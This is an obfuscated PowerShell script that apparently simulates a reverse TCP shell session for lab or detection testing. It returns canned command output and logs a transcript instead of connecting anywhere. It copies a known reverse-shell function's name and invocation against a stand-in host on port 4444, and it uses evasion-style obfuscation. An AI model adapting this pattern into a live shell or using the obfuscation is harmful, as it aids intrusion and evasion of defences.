function Invoke-PowerShellTcp {
    [CmdletBinding(DefaultParameterSetName = "reverse")]
    param(
        [Parameter(Position = 0 , Mandatory = ${t`RUE} , ParameterSetName = "reverse")]
        [Parameter(Position = 0 , Mandatory = ${t`RUE} , ParameterSetName = "bind")]
        [string]${i`P`ADd`ReSS} , 

        [Parameter(Position = 1 , Mandatory = ${tr`UE} , ParameterSetName = "reverse")]
        [Parameter(Position = 1 , Mandatory = ${tR`Ue} , ParameterSetName = "bind")]
        [int]${pO`Rt} , 

        [Parameter(ParameterSetName = "reverse")]
        [switch]${RevEr`SE} , 

        [Parameter(ParameterSetName = "bind")]
        [switch]${B`Ind} 
    )

    function Invoke-SafeCommand {
        param([string]${co`MMAnD} )

        switch (${COmmA`ND} ) {
            "whoami" { return "lab\demo-user" }
            "hostname" { return "demo-host" }
            "Get-Date" { return (.("{0}{1}{2}" -f 'Get-Da' , 't' , 'e')).ToString("s") }
            "Get-Location" { return (.("{2}{3}{0}{1}" -f 'o' , 'cation' , 'Get-' , 'L')).Path }
            default { return "[safe] Command blocked: $Command" }
        }
    }

    ${Art`iFa`c`TDir} = & ("{1}{0}{2}" -f 'oin-P' , 'J' , 'ath') ${psSC`RI`PT`RoOt} "artifacts\tcp-c2"
    if ( -not (.("{2}{0}{1}" -f 't' , '-Path' , 'Tes') ${Ar`TifA`cTDiR} )) {
        ${Nu`Ll} = .("{0}{2}{1}" -f 'Ne' , 'm' , 'w-Ite') -ItemType Directory -Path ${AR`T`ifAcTdiR} -Force
    }

    ${e`NcODI`Ng} = & ("{2}{0}{3}{1}" -f '-Ob' , 't' , 'New' , 'jec') System.Text.ASCIIEncoding
    ${TRANsCR`I`Pt} = .("{0}{2}{1}" -f 'Join-P' , 'h' , 'at') ${A`RTiFa`cTdIr} "session.txt"
    ${M`OdE} = if (${B`iND} ) { "bind" } else { "reverse" }

    & ("{1}{3}{0}{2}" -f 'n' , 'Set-Cont' , 't' , 'e') -Path ${T`RaNSC`RIpT} -Value "[safe] Starting simulated $mode TCP session to $IPAddress`:$Port" -Encoding UTF8
    .("{2}{0}{1}{3}" -f 'rit' , 'e-Outpu' , 'W' , 't') "[safe] Simulating $mode TCP session to $IPAddress`:$Port"

    ${comm`A`NdS} = @("whoami" , "Get-Date" , "hostname" , "Get-Location")

    foreach (${c`OmM`AND} in ${c`OMmA`N`dS} ) {
        ${C`Omm`AndbY`Tes} = ${e`NCO`ding}.GetBytes(${com`Ma`ND} )
        ${RECE`I`V`EdC`OmmaND} = ${En`Cod`iNg}.GetString(${c`OMMANDBYt`Es} , 0 , ${Co`mMAn`db`yT`es}.Length)
        ${S`EndBa`Ck} = .("{2}{4}{0}{1}{3}" -f 'eComma' , 'n' , 'Inv' , 'd' , 'oke-Saf') -Command ${rEcE`iV`e`DCOmma`ND} 
        ${S`EnD`BYtES} = ${enCO`Di`Ng}.GetBytes(${sEndBa`ck} )

        & ("{0}{3}{2}{1}" -f 'Add-' , 't' , 'ten' , 'Con') -Path ${TrAn`s`CRIpt} -Value "RECV> $receivedCommand"
        & ("{1}{2}{0}" -f 'Content' , 'Ad' , 'd-') -Path ${T`Ran`SCrI`PT} -Value "SEND> $($encoding.GetString($sendBytes, 0, $sendBytes.Length))"

        .("{2}{0}{1}" -f 'te-' , 'Output' , 'Wri') "PS $receivedCommand"
        .("{1}{2}{3}{0}" -f 'tput' , 'Wri' , 'te-O' , 'u') ${S`eND`BAck} 
    }

    .("{3}{0}{2}{1}" -f 'te-' , 'put' , 'Out' , 'Wri') "[safe] Simulated TCP session finished."
}

& ("{0}{2}{1}{4}{3}" -f 'In' , 'o' , 'voke-P' , 'llTcp' , 'werShe') -IPAddress "198.51.100.25" -Port 4444 -Reverse
